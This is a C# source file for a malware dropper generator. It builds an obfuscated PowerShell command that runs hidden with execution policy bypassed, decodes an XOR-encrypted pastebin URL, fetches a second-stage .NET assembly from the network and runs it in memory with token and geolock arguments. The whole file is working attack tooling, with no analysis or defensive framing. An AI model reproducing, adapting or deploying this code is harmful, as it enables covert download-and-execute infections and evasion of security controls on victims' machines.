using System;
using System.Linq;
using System.Text;

namespace dropper
{
    public class PGen
    {
        private const string payload_uri = "https://pastebin.com/raw/LLqxW7MB";

        public static string GenerateCommand(string token, string prefix, string geolock, Random rng)
        {
            string xorkey = RandomString(payload_uri.Length, rng);
            string varname = RandomString(6, rng);
            string varname2 = RandomString(6, rng);
            string srcvarname = RandomString(6, rng);
            string classname = RandomString(6, rng);
            string functionname = RandomString(6, rng);
            string xorclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i]); } return input; } }"));
            return $"-noprofile -executionpolicy bypass -windowstyle hidden -command ${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{xorclass}'));Add-Type -TypeDefinition ${srcvarname};${varname} = New-Object System.Net.WebClient;${varname2} = ${varname}.DownloadData([System.Text.Encoding]::UTF8.GetString(${varname}.DownloadData([System.Text.Encoding]::UTF8.GetString([{classname}]::{functionname}([System.Convert]::FromBase64String('{Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes(payload_uri), xorkey))}'), '{xorkey}')))));${varname}.Dispose();[System.Reflection.Assembly]::Load(${varname2}).EntryPoint.Invoke($null, (, [string[]] ('{token}', '{prefix}', '{geolock}')))";
        }

        private static string RandomString(int length, Random rng)
        {
            string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rng.Next(s.Length)]).ToArray());
        }
        private static byte[] XORCrypt(byte[] input, string key)
        {
            byte[] keyc = Encoding.UTF8.GetBytes(key);
            for (int i = 0; i < input.Length; i++)
            {
                input[i] = (byte)(input[i] ^ keyc[i]);
            }
            return input;
        }
    }
}
